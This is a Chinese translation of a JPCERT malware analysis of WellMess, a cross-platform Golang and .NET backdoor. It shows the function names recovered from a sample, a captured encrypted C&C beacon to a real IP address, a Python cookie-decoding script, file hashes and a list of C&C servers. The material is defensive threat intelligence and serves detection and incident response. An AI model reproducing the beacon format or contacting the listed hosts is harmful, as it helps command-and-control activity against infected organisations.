# 针对 Linux 及 Windows 平台的恶意软件 WellMess 分析

阅读量 **247440**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-07-09 16:00:43

 **x**

##### 译文声明

本文是翻译文章，文章来源：blog.jpcert.or.jp

原文地址：<https://blog.jpcert.or.jp/2018/07/malware-wellmes-9b78.html>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01e2cc5356eb442b88.jpg)

## 写在前面的话

一些恶意软件如果想在多个平台上运行，最常见的方法是使用Java语言来编写。例如，在过去的[文章](https://blog.jpcert.or.jp/2016/05/decoding-obfuscated-strings-in-adwind.html)中介绍的Adwind恶意软件是用Java编写的，它可以在Windows和其他操作系统上运行。但本文介绍的恶意软件并不是使用java编写的，而是通过Golang所编写。

本文将介绍一款名为WellMess恶意软件的行为。它是一种在Golang中编程的恶意软件，并经过交叉编译，使其与Linux和Windows兼容。有关恶意软件功能的更多详细信息，请参阅LAC
[1]的报告。

## WellMess的行为

通常，Golang可执行文件本身包含许多必需的库。这通常会增加文件大小，使WellMess大于3
MB。另一个特性是可以在文件本身中找到可执行文件的函数名称。（即使对于剥离文件，也可以使用GoUtils2.0
[2]等工具检索函数名。）以下是WellMess中使用的函数名称：

    
    
    _/home/ubuntu/GoProject/src/bot/botlib.EncryptText
    _/home/ubuntu/GoProject/src/bot/botlib.encrypt
    _/home/ubuntu/GoProject/src/bot/botlib.Command
    _/home/ubuntu/GoProject/src/bot/botlib.reply
    _/home/ubuntu/GoProject/src/bot/botlib.Service
    _/home/ubuntu/GoProject/src/bot/botlib.saveFile
    _/home/ubuntu/GoProject/src/bot/botlib.UDFile
    _/home/ubuntu/GoProject/src/bot/botlib.Download
    _/home/ubuntu/GoProject/src/bot/botlib.Send
    _/home/ubuntu/GoProject/src/bot/botlib.Work
    _/home/ubuntu/GoProject/src/bot/botlib.chunksM
    _/home/ubuntu/GoProject/src/bot/botlib.Join
    _/home/ubuntu/GoProject/src/bot/botlib.wellMess
    _/home/ubuntu/GoProject/src/bot/botlib.RandStringBytes
    _/home/ubuntu/GoProject/src/bot/botlib.GetRandomBytes
    _/home/ubuntu/GoProject/src/bot/botlib.Key
    _/home/ubuntu/GoProject/src/bot/botlib.GenerateSymmKey
    _/home/ubuntu/GoProject/src/bot/botlib.CalculateMD5Hash
    _/home/ubuntu/GoProject/src/bot/botlib.Parse
    _/home/ubuntu/GoProject/src/bot/botlib.Pack
    _/home/ubuntu/GoProject/src/bot/botlib.Unpack
    _/home/ubuntu/GoProject/src/bot/botlib.UnpackB
    _/home/ubuntu/GoProject/src/bot/botlib.FromNormalToBase64
    _/home/ubuntu/GoProject/src/bot/botlib.RandInt
    _/home/ubuntu/GoProject/src/bot/botlib.Base64ToNormal
    _/home/ubuntu/GoProject/src/bot/botlib.KeySizeError.Error
    _/home/ubuntu/GoProject/src/bot/botlib.New
    _/home/ubuntu/GoProject/src/bot/botlib.(*rc6cipher).BlockSize
    _/home/ubuntu/GoProject/src/bot/botlib.convertFromString
    _/home/ubuntu/GoProject/src/bot/botlib.(*rc6cipher).Encrypt
    _/home/ubuntu/GoProject/src/bot/botlib.(*rc6cipher).Decrypt
    _/home/ubuntu/GoProject/src/bot/botlib.Split
    _/home/ubuntu/GoProject/src/bot/botlib.Cipher
    _/home/ubuntu/GoProject/src/bot/botlib.Decipher
    _/home/ubuntu/GoProject/src/bot/botlib.Pad
    _/home/ubuntu/GoProject/src/bot/botlib.AES_Encrypt
    _/home/ubuntu/GoProject/src/bot/botlib.AES_Decrypt
    _/home/ubuntu/GoProject/src/bot/botlib.generateRandomString
    _/home/ubuntu/GoProject/src/bot/botlib.deleteFile
    _/home/ubuntu/GoProject/src/bot/botlib.Post
    _/home/ubuntu/GoProject/src/bot/botlib.SendMessage
    _/home/ubuntu/GoProject/src/bot/botlib.ReceiveMessage
    _/home/ubuntu/GoProject/src/bot/botlib.Send.func1
    _/home/ubuntu/GoProject/src/bot/botlib.init
    _/home/ubuntu/GoProject/src/bot/botlib.(*KeySizeError).Error
    

如前所述，WellMess有一个在Windows（PE）上运行的版本，还有一个在Linux（ELF）上运行的版本。尽管存在一些细微差别，但它们都具有相同的功能。恶意软件使用HTTP请求与C＆C服务器通信，并根据收到的命令执行功能。以下是通信示例:(用户代理值因样本而异。）

    
    
    POST / HTTP/1.1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html, */*
    Accept-Language: en-US,en;q=0.8
    Cookie: c22UekXD=J41lrM+S01+KX29R+As21Sur+%3asRnW+3Eo+nIHjv+o6A7qGw+XQr%3aq+PJ9jaI+KQ7G.+FT2wr+wzQ3vd+3IJXC+lays+k27xd.+di%3abd+mHMAi+mYNZv+Mrp+S%2cV21.+ESollsY+6suRD+%2cx8O1m+%3azc+GYdrw.+FbWQWr+5pO8;1rf4EnE9=+WMyn8+8ogDA+WxR5R.+sFMwDnV+DFninOi+XaP+p4iY+82U.+hZb+QB6+kMBvT9R
    Host: 45.123.190.168
    Content-Length: 426
    Expect: 100-continue
    Accept-Encoding: deflate
    Connection: Keep-Alive
    
    pgY4C8 8JHqk RjrCa R9MS 3vc4Uk KKaRxH R8vg Tfj B3P,C 0RG9lFw DqF405. i3RU1 0lW 2BqdSn K3L Y7hEc. tzto yKU8 p1,E L2kKg pQcE1. b8V6S0Y 6akx, ggMcrXk 0csao Uwxn. fYVtWD rwt:BJ 5IBn rCMxZoo OsC. :ZXg pKT Re0 cJST1 L0GsC. 9dJZON9 qs29pPB pCTR:8 0hO0FK sK13UUw. jMA hDICL hGK1 qjRj1AY YMjAIeI. g7GEZPh gW:C eNX6 ptq kevfIyP. u,96r7c D:6ZiR fCC IIi cBvq,p. Vt96aEu JFLeu 0XtFJm ee4S 7M2. Uc68sF MArC5v 96ngG 9UvQGt 5:ut. qiE0xQ
    

命令执行的结果在HTTP
POST请求数据中发送，该数据是RSA加密的。Cookie标头中的数据是RC6加密的。以下是解密数据的示例。它包含受感染主机的标识符（<;
head;>标记之间的值）。

    
    
    <;head;>6F3C9B16C16074079AFCFF09C6717B0F07864FFE09C1E1DB003B3627D174913B/p<;head;><;title;>a:1_0<;title;><;service;>p<;service;>
    

下面是解码Cookie标头中数据的代码的一部分。（该脚本在[Github](https://github.com/JPCERTCC/aa-tools/blob/master/wellmess_cookie_decode.py)上可以找到。）

    
    
    def decode(data, key):
        sep = ';'
    
        field = data.split(sep)
    
        i = 1
        encdata = ""
        while i < len(field):
            value = field[i].split("=")
            encdata += value[1]
            I += 1
    
        encdata = urllib.unquote(encdata)
        encdata = encdata.replace("+", " ").replace("   ", "=").replace(". ", "").replace(" ", "").replace(",", "+").replace(":", "/")
    
        maindata = base64.b64decode(encdata)
        s = generateKey(base64.b64decode(key))
    
        i = 0
        decode = ""
        while i < len(maindata):
            orgi = rc6(maindata[i:i + 16], s)
            decode += orgi
            i += 16
    
        print("Decrypted String: %s" % decode)
    

当从C＆C服务器接收命令时，恶意软件可以执行以下功能。  
1.执行任意shell命令  
2.上传/下载文件  
此外，PE文件恶意软件执行PowerShell脚本。

## 基于.Net Framework开发的Wellmess

还有一个在.Net
Framework中开发的版本。图1显示了在与C＆C服务器通信时生成Cookie头中包含的数据的代码。它包含与Golang版本中Cookie数据相同的字符串。

![](https://p3.ssl.qhimg.com/t0189d679e1193d8869.png)

## 最后

我们已经确认了一些在日本组织中发现WellMess感染的病例。使用恶意软件的攻击可能会继续。  
我们在附录A中列出了样本的一些哈希值。我们已经确认的一些C＆C服务器也列在附录B中。请确保您的设备都没有访问这些主机。

  * Shusei Tomonaga  
（Yukako Uchida翻译）

## 参考

[1] LAC：网络应急中心报告第3卷（日文）  
<https://www.lac.co.jp/lacwatch/pdf/20180614_cecreport_vol3.pdf>  
[2] GoUtils2.0  
<https://gitlab.com/zaytsevgu/GoUtils2.0/>

###  附录A：SHA-256哈希值

    
    
    bec1981e422c1e01c14511d384a33c9bcc66456c1274bbbac073da825a3f537d（Golang＆PE）
    2285a264ffab59ab5a1eb4e2b9bcab9baf26750b6c551ee3094af56a4442ac41（.Net＆PE）
    

###  附录B：C＆C服务器

    
    
    45.123.190.168
    103.13.240.46
    101.201.53.27
    185.217.92.171
    93.113.45.101
    191.101.180.78
    

审核人：yiwang 编辑：边边

本文翻译自blog.jpcert.or.jp [原文链接](https://blog.jpcert.or.jp/2018/07/malware-wellmes-9b78.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **无名小卒** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/151198](/post/id/151198)

安全客 - 有思想的安全新媒体

本文转载自: [blog.jpcert.or.jp](https://blog.jpcert.or.jp/2018/07/malware-wellmes-9b78.html)

如若转载,请注明出处： <https://blog.jpcert.or.jp/2018/07/malware-wellmes-9b78.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)
  * [安全研究](/tag/安全研究)
  * [WellMess](/tag/WellMess)

 **+1** __0赞

 __收藏

![](https://p3.ssl.qhimg.com/t013aa021a06d47a307.png) 无名小卒

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

